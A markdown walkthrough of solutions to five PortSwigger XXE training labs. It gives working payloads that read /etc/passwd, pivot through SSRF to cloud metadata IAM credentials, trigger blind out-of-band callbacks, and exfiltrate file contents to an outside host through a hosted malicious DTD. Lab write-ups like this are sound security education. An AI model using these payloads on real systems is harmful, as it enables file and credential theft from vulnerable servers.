<!-- omit in toc -->
# XXE

<!-- omit in toc -->
## Table of Contents

- [Exploiting XXE using external entities to retrieve files](#exploiting-xxe-using-external-entities-to-retrieve-files)
- [Exploiting XXE to perform SSRF attacks](#exploiting-xxe-to-perform-ssrf-attacks)
- [Blind XXE with out-of-band interaction](#blind-xxe-with-out-of-band-interaction)
- [Blind XXE with out-of-band interaction via XML parameter entities](#blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities)
- [Exploiting blind XXE to exfiltrate data using a malicious external DTD](#exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd)

## Exploiting XXE using external entities to retrieve files
Reference: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files

<!-- omit in toc -->
### Solution
1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
2. Insert the following external entity definition in between the XML declaration and the ``stockCheck`` element:
```
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```
3. Replace the ``productId`` number with a reference to the external entity: ``&xxe;``. The response should contain "Invalid product ID:" followed by the contents of the ``/etc/passwd`` file.

## Exploiting XXE to perform SSRF attacks
Reference: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf

<!-- omit in toc -->
### Solution 
1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
2. Insert the following external entity definition in between the XML declaration and the ``stockCheck`` element:
```
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
```
3. Replace the ``productId`` number with a reference to the external entity: ``&xxe;``. The response should contain "Invalid product ID:" followed by the response from the metadata endpoint, which will initially be a folder name.
4. Iteratively update the URL in the DTD to explore the API until you reach ``/latest/meta-data/iam/security-credentials/admin``. This should return JSON containing the ``SecretAccessKey``.

## Blind XXE with out-of-band interaction
Reference: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction

<!-- omit in toc -->
### Solution
1. Visit a product page, click "Check stock" and intercept the resulting POST request in Burp Suite Professional.
2. Go to the Burp menu, and launch the Burp Collaborator client.
3. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
4. Insert the following external entity definition in between the XML declaration and the ``stockCheck`` element, but insert your Burp Collaborator subdomain where indicated:
```
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net"> ]>
```
5. Replace the ``productId`` number with a reference to the external entity:
```
&xxe;
```
6. Go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.

## Blind XXE with out-of-band interaction via XML parameter entities
Reference: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities

<!-- omit in toc -->
### Solution
1. Visit a product page, click "Check stock" and intercept the resulting POST request in Burp Suite Professional.
2. Go to the Burp menu, and launch the Burp Collaborator client.
3. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
4. Insert the following external entity definition in between the XML declaration and the ``stockCheck`` element, but insert your Burp Collaborator subdomain where indicated:
```
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net"> %xxe; ]>
```
5. Go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.

## Exploiting blind XXE to exfiltrate data using a malicious external DTD
Reference: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration

<!-- omit in toc -->
### Quick Solution
In this lab a **malicious** DTD must be crafted and hosted on the exploit server and the **check stock** request must be tampered by adding a XML parameter entity. Payload in the next paragraph.

<!-- omit in toc -->
### Solution
1. Using Burp Suite Professional, go to the Burp menu, and launch the Burp Collaborator client.
2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
3. Place the Burp Collaborator payload into a malicious DTD file:
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/?x=%file;'>">
%eval;
%exfil;
```
4. Click "Go to exploit server" and save the malicious DTD file on your server. Click "View exploit" and take a note of the URL.
5. You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
6. Insert the following external entity definition in between the XML declaration and the ``stockCheck`` element:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
```
7. Go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again.
8. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The HTTP interaction could contain the contents of the ``/etc/hostname`` file.